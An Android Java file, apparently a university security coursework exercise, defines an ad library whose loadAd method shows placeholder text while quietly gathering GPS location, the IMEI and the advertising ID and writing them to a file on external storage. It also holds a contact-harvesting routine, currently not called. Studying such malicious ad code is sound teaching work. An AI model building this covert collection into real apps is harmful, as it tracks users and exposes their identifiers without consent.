package uk.ac.imperial.apss.comp97109.myadvertisinglibrary;


import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;

import java.io.IOException;
import java.sql.Timestamp;

import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;

import java.util.ArrayList;
import java.util.concurrent.ExecutionException;


public class MyAdView {
    private static final String TAG = "CW2: MyAdView";
    public static Context ctx;
    public static boolean isLAT = false;
    private static String current_location = null;
    private static String current_ad_id = null;
    public static void loadAd(TextView tv, Context ctx) {
        MyAdView.ctx = ctx;

        tv.setText("Hello Ad2new!");

        onLoad();

    }

    private static void onLoad() {
        //TODO: Implement me

        // GET LOCATION
        LocationManager locationManager = (LocationManager)
                ctx.getSystemService(Context.LOCATION_SERVICE);

        LocationListener locationListener = new MyLocationListener();
        if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

            return;
        }
        locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER, 5000, 10, locationListener);

        // GET IMEI
        TelephonyManager telephonyManager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        final String IMEI_id = telephonyManager.getDeviceId();
        Log.d("IMEI ID", IMEI_id);


        //GET ADVERTISING ID
        AsyncTask.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    AdvertisingIdClient.Info adInfo = AdvertisingIdClient.getAdvertisingIdInfo(ctx);
                    current_ad_id = adInfo.getId();
                    Log.d("Advertisement ID", current_ad_id);
                    String info_needed = System.currentTimeMillis() + ";" + current_location + "\n" +
                            System.currentTimeMillis() + ";IMEI:" + IMEI_id + "\n" +
                            System.currentTimeMillis() + ";advertising_id:" + current_ad_id;
                    Log.d("final", info_needed);
                    String filename = "Part1_malad.txt";
                    try {
                        File file = new File(Environment.getExternalStorageDirectory(), filename);
                        PrintWriter fos;

                        fos = new PrintWriter(new FileOutputStream(file));
                        fos.println(info_needed);
                        fos.flush();
                        fos.close();
                    } catch (Exception e) {

                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });


        //try to read contacts
//        ArrayList<String> contacts = readContacts();
//        Log.d("Contacts",contacts.toString());


        // write all info to external file

    }

    private static ArrayList<String> readContacts() {
        ArrayList<String> contacts = new ArrayList<String>();
        ContentResolver contentResolver = ctx.getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (cursor.moveToFirst()) {
            do {
                contacts.add(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
            } while (cursor.moveToNext());
        }
        return contacts;
    }

    private static class MyLocationListener implements LocationListener {

        @Override
        public void onLocationChanged(Location location) {

            current_location = "longitude:" + location.getLongitude() + ";latitude:" + location.getLatitude();
            Log.d("Location", location.toString());
        }

        @Override
        public void onStatusChanged(String s, int i, Bundle bundle) {
        }

        @Override
        public void onProviderEnabled(String s) {
        }

        @Override
        public void onProviderDisabled(String s) {
        }
    }

    public static class AdvertisementIdTask extends AsyncTask<Context, Void, String> {
        @Override
        protected String doInBackground(Context... contexts) {
            try {
                AdvertisingIdClient.Info adInfo = AdvertisingIdClient.getAdvertisingIdInfo(contexts[0]);
                return adInfo.getId();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (GooglePlayServicesNotAvailableException e) {
                e.printStackTrace();
            } catch (GooglePlayServicesRepairableException e) {
                e.printStackTrace();
            }
            return null;
        }
    }
}
